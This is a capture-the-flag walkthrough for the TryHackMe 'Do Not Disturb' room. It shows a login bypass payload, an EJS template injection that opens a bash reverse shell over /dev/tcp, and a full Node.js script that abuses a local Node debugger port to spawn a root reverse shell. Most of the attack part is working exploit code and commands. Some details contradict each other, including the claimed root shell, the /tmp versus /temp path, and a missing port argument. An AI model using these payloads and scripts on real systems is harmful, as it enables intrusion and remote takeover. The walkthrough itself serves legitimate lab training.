<p align="center">
  <img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785251618019&w=96&q=75">
</p>

# Do Not Disturb

In this room, the objective is to exploit an EJS injection vulnerability to gain initial access, establish a reverse shell, and complete the challenge by reaching the target Flags.

Target application:
```
http://MACHINE_IP
```
Goal:
- [x] Obtain user.txt
- [x] Obtain root.txt



## STEP 01

- Start with the SSI (Server Side Injection)
- Open the developer option `F12`
- Navigate to the `Network Tab`
- Enable `cache`
- Then check Header info
  ```bash
  curl -I http://<MACHINE_IP>
  ```
  IMPORTANT
  ```text
  Web server: Express (Node.js)
  Endpoint: POST /login
  ```
  > According to this, we can see the application is likely a Node.js web application using the Express.js framework.

- Check available routes
  ```bash
  gobuster dir -u http://10.48.151.238 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
  output:
  ```
  /login
  /staff
  ```
- Try fake login
  ```
  username: admin
  password: 1234
  ```
- Then go to the `Network Tab`
- Select the request,
- Right-click and `Edit and resend.`
- Then add the Express js Payload
  ```
  username=attendant&password[$ne]=x
  ```
-  Resend the request
-  Check the request for `Set-cookie`
-  Then copy the `Content-ID` and `value` separately
- Go to the staff page tab
- Select the `Storage` Tab
- Select `cookies` and `Create New cookie`
- Paste the `Content ID` and `value`
- Refresh
- Then log in to the app


## STEP 02
- Now the EJS Injection part
- Open a new terminal and start `NC listener`
  ```
  nc -nvlp 2500
  ```
- Use this EJS payload
  ```
  <pre><%= process.getBuiltinModule('child_process').execSync('bash -c "bash -i >& /dev/tcp/<YOURMACHINEIP>/2500 0>&1"').toString() %></pre>
  ```
- This will open a reverse shell for you from root.
- Then check privileges
  ```
  whoami
  ```
- Then search for `user.txt`
  ```
  find / -name "user.txt" 2>/dev/null
  ```
- Go to the folder and open it
  ```
  cat user.txt
  ```
- you found the user flag

## STEP 03
- Now the privilege escalation part
  > You are not a root user, so you cannot access the root folder.
- Create a temporary privilege escalation script
  ```
  cat > /tmp/userswitch.js << 'EOF'
  const http = require('http');
  const net  = require('net');
  const crypto = require('crypto');
  
  const LHOST = process.argv[2];
  const LPORT = process.argv[3];
  const PHOST = '127.0.0.1', PPORT = 9229;
  
  function getWsUrl() {
    return new Promise((resolve, reject) => {
      http.get(`http://${PHOST}:${PPORT}/json/list`, res => {
        let d = '';
        res.on('data', c => d += c);
        res.on('end', () => {
          try {
            const t = JSON.parse(d);
            const hit = (Array.isArray(t) ? t : [t]).find(x => x && x.webSocketDebuggerUrl);
            if (hit) return resolve(hit.webSocketDebuggerUrl);
            // fallback: /json/version
            http.get(`http://${PHOST}:${PPORT}/json/version`, r2 => {
              let d2 = '';
              r2.on('data', c => d2 += c);
              r2.on('end', () => resolve(JSON.parse(d2).webSocketDebuggerUrl));
            }).on('error', reject);
          } catch (e) { reject(e); }
        });
      }).on('error', reject);
    });
  }
  
  class WS {
    constructor(url) { this.url = url; this.buf = Buffer.alloc(0); this.pending = null; }
    connect() {
      return new Promise((resolve, reject) => {
        const u = new URL(this.url);
        const key = crypto.randomBytes(16).toString('base64');
        this.sock = net.connect(PPORT, PHOST, () => {
          this.sock.write([
            `GET ${u.pathname}${u.search} HTTP/1.1`,
            `Host: ${PHOST}:${PPORT}`,
            'Upgrade: websocket', 'Connection: Upgrade',
            `Sec-WebSocket-Key: ${key}`,
            'Sec-WebSocket-Version: 13', '', ''
          ].join('\r\n'));
        });
        let handshake = '', done = false;
        this.sock.on('data', chunk => {
          if (!done) {
            handshake += chunk.toString('utf8');
            const i = handshake.indexOf('\r\n\r\n');
            if (i === -1) return;
            done = true;
            this.buf = Buffer.from(handshake.slice(i + 4), 'utf8');
            this._drain();
            resolve();
          } else {
            this.buf = Buffer.concat([this.buf, chunk]);
            this._drain();
          }
        });
        this.sock.on('error', reject);
      });
    }
    _drain() {
      while (this.buf.length >= 2) {
        const op = this.buf[0] & 0x0f;
        let len = this.buf[1] & 0x7f, off = 2;
        if (len === 126) { len = this.buf.readUInt16BE(2); off = 4; }
        else if (len === 127) { len = Number(this.buf.readBigUInt64BE(2)); off = 10; }
        if (this.buf.length < off + len) return;
        const payload = this.buf.slice(off, off + len);
        this.buf = this.buf.slice(off + len);
        if (op === 1) {
          const msg = JSON.parse(payload.toString('utf8'));
          if (this.pending && this.pending.id === msg.id) { this.pending.resolve(msg); this.pending = null; }
        }
      }
    }
    send(obj) {
      const payload = Buffer.from(JSON.stringify(obj));
      const mask = crypto.randomBytes(4);
      const masked = Buffer.alloc(payload.length);
      for (let i = 0; i < payload.length; i++) masked[i] = payload[i] ^ mask[i % 4];
      let header;
      if (payload.length < 126)      { header = Buffer.alloc(6); header[0] = 0x81; header[1] = 0x80 | payload.length; mask.copy(header, 2); }
      else                            { header = Buffer.alloc(8); header[0] = 0x81; header[1] = 0x80 | 126; header.writeUInt16BE(payload.length, 2); mask.copy(header, 4); }
      this.sock.write(Buffer.concat([header, masked]));
      return new Promise(resolve => { this.pending = { id: obj.id, resolve }; });
    }
  }
  
  (async () => {
    const ws = new WS(await getWsUrl());
    await ws.connect();
    console.log('[+] connected to inspector');
  
    const idCheck = await ws.send({
      id: 1, method: 'Runtime.evaluate',
      params: { expression: "process.mainModule.require('child_process').execSync('id').toString()" }
    });
    console.log('[+] running as: ' + JSON.stringify(idCheck.result.result.value || idCheck.result));
  
    const expr = `(process.mainModule.require('child_process').spawn('/bin/bash',['-c','bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'],{detached:true,stdio:'ignore'}).unref(),'shell fired')`;
    await ws.send({ id: 2, method: 'Runtime.evaluate', params: { expression: expr } });
    console.log('[+] payload sent — check nc listener ' + LHOST + ':' + LPORT);
    setTimeout(() => process.exit(0), 2000);
  })().catch(e => { console.error('[-] ' + e.message); process.exit(1); });
  EOF
  ```
- Then run it using Node. js
  ```
  node /temp/userswitch.js <YOURMACHINEIP>
  ```
  > BEFORE RUNNING THIS, OPEN A NEW TERMINAL AND RUN ANOTHER NC LISTENER WITH ANOTHER PORT NUMBER
- Now you have root access in the new terminal
- Find root.txt
  ```
  find / -name "root.txt" 2>/dev/null
  ```
- Open it
  ```
    cat root.txt
  ```
  
## You have found the  **TWO FLAGs** 🚩

# Congratulations on our Exploration 🎉
